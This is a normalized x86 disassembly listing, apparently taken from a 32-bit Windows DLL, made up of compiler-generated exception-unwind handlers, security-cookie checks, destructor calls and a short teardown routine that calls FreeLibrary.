xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cd80
mov eax [ ebp + 0x8 ]
push eax
call sub_100025d0
retn
sub_1001cd8a
mov esi [ ebp + 0x8 ]
add esi 0x110
jmp sub_10002a30
sub_1001cd98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cdc0
lea eax [ ebp - 0x24 ]
jmp sub_10003f70
sub_1001cdc8
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001cdd3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001ce00
lea eax [ ebp + 0xc ]
jmp sub_10003f70
sub_1001ce08
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001ce30
mov eax [ ebp - 0x18 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001ce3b
mov ecx [ ebp - 0x1c ]
jmp sub_10003e60
sub_1001ce43
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001ce60
mov eax [ ebp + 0x8 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001ce6b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001ce90
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001ce98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cec0
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001cecb
mov esi [ ebp - 0x14 ]
jmp sub_10002a30
sub_1001ced3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cef0
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001cefb
mov esi [ ebp - 0x14 ]
jmp sub_10002a30
sub_1001cf03
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cf20
mov eax [ ebp + 0x8 ]
push eax
call sub_100025d0
retn
sub_1001cf2a
mov esi [ ebp + 0x8 ]
add esi 0x1c
jmp sub_10002a30
sub_1001cf35
mov esi [ ebp + 0x8 ]
add esi 0x38
jmp sub_10002a30
sub_1001cf40
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cf60
lea eax [ ebp - 0x24 ]
jmp sub_10003f70
sub_1001cf68
mov eax [ ebp - 0x28 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001cf73
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cfa0
mov eax [ ebp + 0x8 ]
push eax
call sub_100025d0
retn
sub_1001cfaa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001cfd0
mov eax [ ebp - 0x401c ]
push eax
call sub_100025d0
retn
sub_1001cfdd
mov esi [ ebp - 0x401c ]
add esi 0xc
jmp sub_10002a30
sub_1001cfeb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x401c ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d020
mov eax [ ebp + 0x8 ]
push eax
call sub_100025d0
retn
sub_1001d02a
mov esi [ ebp + 0x8 ]
add esi 0xc
jmp sub_10002a30
sub_1001d035
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d050
mov ecx [ ebp + 0x8 ]
jmp sub_10009260
sub_1001d058
mov esi [ ebp + 0x8 ]
add esi 0x38
jmp sub_10002a30
sub_1001d063
mov esi [ ebp + 0x8 ]
add esi 0x54
jmp sub_10010690
sub_1001d06e
mov esi [ ebp + 0x8 ]
add esi 0x70
jmp sub_10010690
sub_1001d079
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d0a0
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d0ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d0d0
lea esi [ ebp - 0x1dd4 ]
jmp sub_10010690
sub_1001d0db
lea esi [ ebp - 0x1db8 ]
jmp sub_10010690
sub_1001d0e6
lea esi [ ebp - 0x1d9c ]
jmp sub_10002a30
sub_1001d0f1
lea esi [ ebp - 0x1df0 ]
jmp sub_10002a30
sub_1001d0fc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1e60 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d130
lea ecx [ ebp - 0x5c ]
jmp sub_1000e840
sub_1001d138
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d160
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d168
lea esi [ ebp - 0x48 ]
jmp sub_10002a30
sub_1001d170
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d1a0
lea esi [ ebp - 0x5c ]
jmp sub_10002a30
sub_1001d1a8
lea esi [ ebp - 0x78 ]
jmp sub_10002a30
sub_1001d1b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xb8 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d1e0
lea esi [ ebp + 0xc ]
jmp sub_10002a30
sub_1001d1e8
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d1f3
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d1fb
mov ecx [ ebp - 0x10 ]
jmp sub_10009260
sub_1001d203
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_10002a30
sub_1001d20e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d230
lea esi [ ebp - 0x5c ]
jmp sub_10002a30
sub_1001d238
lea esi [ ebp - 0x78 ]
jmp sub_10002a30
sub_1001d240
lea esi [ ebp - 0x78 ]
jmp sub_10002a30
sub_1001d248
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d270
lea esi [ ebp - 0x78 ]
jmp sub_10002a30
sub_1001d278
lea esi [ ebp - 0x5c ]
jmp sub_10002a30
sub_1001d280
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d2b0
mov eax [ ebp - 0x10 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d2bb
mov eax [ ebp + 0xc ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d2c6
mov eax [ ebp + 0xc ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d2d1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d2f0
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d2f8
lea esi [ ebp - 0x48 ]
jmp sub_10002a30
sub_1001d300
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d330
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d338
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d360
mov eax [ ebp + 0xc ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d36b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d390
mov eax [ ebp - 0x6c ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d39b
lea esi [ ebp - 0x48 ]
jmp sub_10010690
sub_1001d3a3
lea esi [ ebp - 0x2c ]
jmp sub_10010690
sub_1001d3ab
lea esi [ ebp - 0x64 ]
jmp sub_10010690
sub_1001d3b3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d3e0
mov eax [ ebp - 0x4c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x4c ] 0xfffffffe
mov esi [ ebp - 0x50 ]
jmp sub_10002a30
sub_1001d3f9
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d401
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d409
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d430
lea esi [ ebp + 0xc ]
jmp sub_10002a30
sub_1001d438
lea esi [ ebp - 0x48 ]
jmp sub_10002a30
sub_1001d440
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d448
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d450
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d458
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d460
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
j_sub_10011d00#3
jmp sub_10011d00
sub_1001d495
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d4b0
mov eax [ ebp - 0x70 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d4bb
mov eax [ ebp - 0x70 ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d4c6
mov eax [ ebp - 0x6c ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d4d1
lea eax [ ebp - 0x90 ]
jmp sub_1000c670
sub_1001d4dc
mov eax [ ebp - 0x6c ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d4e7
mov ecx [ ebp - 0x6c ]
jmp sub_10007e40
sub_1001d4ef
mov eax [ ebp - 0x6c ]
push eax
call sub_10012c4b
pop ecx
retn
sub_1001d4fa
lea eax [ ebp - 0x28 ]
jmp sub_10003f70
sub_1001d502
lea eax [ ebp - 0x54 ]
push eax
call sub_10007af0
retn
sub_1001d50c
lea ecx [ ebp - 0xa4 ]
jmp sub_10004cf0
sub_1001d517
lea eax [ ebp - 0x68 ]
jmp sub_10003f70
sub_1001d51f
lea eax [ ebp - 0x68 ]
jmp sub_10003f70
sub_1001d527
lea eax [ ebp - 0xdc ]
jmp sub_1000cc80
sub_1001d532
lea eax [ ebp - 0x3c ]
jmp sub_10003f70
sub_1001d53a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe4 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d570
lea eax [ ebp - 0x28 ]
jmp sub_1000ba30
sub_1001d578
lea eax [ ebp - 0x24 ]
jmp sub_1000ba30
sub_1001d580
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d5a0
lea eax [ ebp + 0x8 ]
jmp sub_1000ba30
sub_1001d5a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d5d0
lea eax [ ebp - 0x14 ]
jmp sub_10003990
sub_1001d5d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d600
lea esi [ ebp - 0x48 ]
jmp sub_10002a30
sub_1001d608
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d610
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc4 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d640
mov eax [ ebp - 0x464 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x464 ] 0xfffffffe
mov esi [ ebp - 0x458 ]
jmp sub_10002a30
sub_1001d662
lea eax [ ebp - 0x480 ]
jmp sub_10003990
sub_1001d66d
lea eax [ ebp - 0x484 ]
jmp sub_10003990
sub_1001d678
lea eax [ ebp - 0x468 ]
jmp sub_10003980
sub_1001d683
lea eax [ ebp - 0x14 ]
jmp sub_10003980
sub_1001d68b
lea eax [ ebp - 0x450 ]
jmp sub_10009270
sub_1001d696
lea esi [ ebp - 0x440 ]
jmp sub_10002a30
sub_1001d6a1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x488 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d6d0
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d6d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d700
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d708
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
j_sub_10011d00#2
jmp sub_10011d00
sub_1001d735
mov esi [ ebp - 0x10 ]
jmp sub_10002a30
sub_1001d73d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d760
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
j_sub_10011d00
jmp sub_10011d00
sub_1001d785
mov esi [ ebp - 0x10 ]
jmp sub_10002a30
j_sub_10011d00#5
jmp sub_10011d00
sub_1001d792
mov esi [ ebp - 0x10 ]
jmp sub_10002a30
sub_1001d79a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d7c0
lea esi [ ebp - 0x4c ]
jmp sub_10002a30
sub_1001d7c8
lea esi [ ebp - 0x4c ]
jmp sub_100113a0
sub_1001d7d0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10012771
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d800
lea esi [ ebp + 0xc ]
jmp sub_10002a30
sub_1001d808
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d810
lea esi [ ebp - 0x48 ]
jmp sub_10002a30
sub_1001d818
lea esi [ ebp - 0x48 ]
jmp sub_10002a30
sub_1001d820
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d850
mov eax [ ebp - 0x3c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x3c ] 0xfffffffe
mov eax [ ebp - 0x40 ]
jmp sub_1000dca0
sub_1001d869
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d871
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d879
lea esi [ ebp - 0x2c ]
jmp sub_10002a30
sub_1001d881
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10012771
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d8b0
lea eax [ ebp - 0x18 ]
jmp sub_1000dca0
sub_1001d8b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d8d3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10012771
mov eax r--data
jmp sub_1001abd9
sub_1001d8f0
call sub_10008010
push sub_1001d910
call sub_10012f92
pop ecx
retn
sub_1001d910
mov eax [ rw-data ]
push esi
mov esi [ FreeLibrary@IAT ]
push eax
mov [ rw-data ] r--data
call esi
mov ecx [ rw-data ]
push ecx
call esi
pop esi
retn
sub_1001d934
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10012864
